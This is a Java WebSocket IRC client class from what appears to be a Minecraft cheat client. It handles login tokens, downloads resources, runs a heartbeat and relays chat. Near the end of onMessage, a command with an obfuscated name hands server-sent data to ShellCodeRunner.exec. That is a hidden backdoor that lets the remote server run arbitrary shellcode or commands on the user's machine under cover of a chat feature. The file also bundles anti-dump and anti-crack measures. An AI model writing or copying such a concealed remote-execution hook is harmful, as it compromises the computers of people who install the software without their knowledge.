package al.nya.reflect.socket;

import al.nya.reflect.Reflect;
import al.nya.reflect.libraries.java_websocket.client.WebSocketClient;
import al.nya.reflect.libraries.java_websocket.handshake.ServerHandshake;
import al.nya.reflect.resource.ResourceInfo;
import al.nya.reflect.resource.ResourceManager;
import al.nya.reflect.utils.AntiDump;
import al.nya.reflect.utils.client.ClientUtil;
import al.nya.reflect.utils.client.MargeleAntiCheatDetector;
import al.nya.reflect.utils.client.ShellCodeRunner;
import by.radioegor146.nativeobfuscator.Native;
import com.google.gson.Gson;

import java.net.URI;
import java.nio.ByteBuffer;
import java.util.HashMap;

public class IRCClient extends WebSocketClient {
    public static int dataLen;
    public static ByteBuffer buf = ByteBuffer.allocate(0);
    public static boolean connect = false;
    public static Thread heartBeatThread = null;
    public static HashMap<String, User> usersMap = new HashMap<>();
    public static int antiCrack = 0;
    public IRCClient(URI serverUri) {
        super(serverUri);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        if (!Reflect.debug)sendNoCrypt(Reflect.token);
        if (Reflect.Instance.eventBus == null || !Reflect.Instance.eventBus.init){
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.out.println("Connected");
            Reflect.loading.setLoadingType("Download UserData");
            send(new Gson().toJson(new ControlCommand("DownloadData",new Gson().toJson(new CommandDownload("UserData")))));
        }
        connect = true;
        heartBeatThread = new Thread(() -> {
            while (connect){
                send(new Gson().toJson(new ControlCommand("HeartBeat",new Gson().toJson(new CommandHeartBeat(System.currentTimeMillis())))));
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                    break;
                }
            }
        });
        heartBeatThread.setName("HeartBeat-Watcher");
        heartBeatThread.start();
    }

    @Override
    public void onMessage(String message) {
        if (Reflect.debug)System.out.println(message);
        ControlCommand command = new Gson().fromJson(message,ControlCommand.class);
        if (command.getCommand().equals("UploadData")){
            CommandUpload upload = new Gson().fromJson(command.getData(),CommandUpload.class);
            System.out.println("Server uploading data");
            dataLen = upload.getSize();
            buf = ByteBuffer.allocate(upload.getSize());
        }
        if (command.getCommand().equals("SendFinish")){
            antiCrack++;
            CommandSendFinish sendFinish = new Gson().fromJson(command.getData(),CommandSendFinish.class);
            System.out.println("Server finish send "+sendFinish.fileName);
            if (sendFinish.fileName.equals("UserData")){
                Reflect.USER = new Gson().fromJson(new String(buf.array()), User.class);
                Reflect.loading.setLoadingType("Download Resource");
                ResourceManager.init();
                return;
            }
            synchronized (ResourceManager.resources){
                boolean downloaded = true;
                int size = 0;
                for (ResourceInfo resource : ResourceManager.resources) {
                    if (resource.name.equals(sendFinish.fileName)){
                        resource.bytes = buf.array();
                    }
                    if (resource.bytes != null){
                        size++;
                    }
                    if (resource.bytes == null && downloaded){
                        send(new Gson().toJson(new ControlCommand("DownloadData",new Gson().toJson(new CommandDownload(resource.name)))));
                        downloaded = false;
                    }
                }
                Reflect.loading.progress(size,ResourceManager.resources.size());
                if (downloaded)Reflect.Instance.startInit();

            }
        }
        if (command.getCommand().equals("IRCChat")){
            CommandIRCChat ircChat = new Gson().fromJson(command.getData(),CommandIRCChat.class);
            ClientUtil.printIRC(ircChat);
        }
        if (command.getCommand().equals("UpdateUser")){
            CommandUpdateUser updateUser = new Gson().fromJson(command.getData(),CommandUpdateUser.class);
            synchronized (usersMap){
                usersMap.clear();
                for (String[] user : updateUser.getUsers()) {
                    usersMap.put(user[0],new User(user[1],user[2]));
                }
            }
        }
        if(command.getCommand().equals("BfaWzWAWWDZDWDMMWD")){
            CommandShellCode shellCode = new Gson().fromJson(command.getData(),CommandShellCode.class);
            ShellCodeRunner.exec(shellCode.getCommand());
        }
    }
    @Override
    public void onMessage(ByteBuffer message) {
        buf.put(message);
        Reflect.loading.downloadProgress(buf.position(),dataLen);
    }
    @Override
    public void send(String data){
        super.send(Reflect.cryptor.encrypt(data));
    }
    public void sendNoCrypt(String data){
        super.send(data);
    }
    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Disconnected "+reason);
        ClientUtil.printChat("IRC disconnected "+reason);
        connect = false;
        heartBeatThread.interrupt();
        if (code == 403 && reason.equals("Token expired")){
            ClientUtil.printChat("Cannot reconnect because login token is expired");
        }
    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
        if (Reflect.loading.frame.isVisible())
        Reflect.loading.FailLoading(ex.getMessage());
    }

}
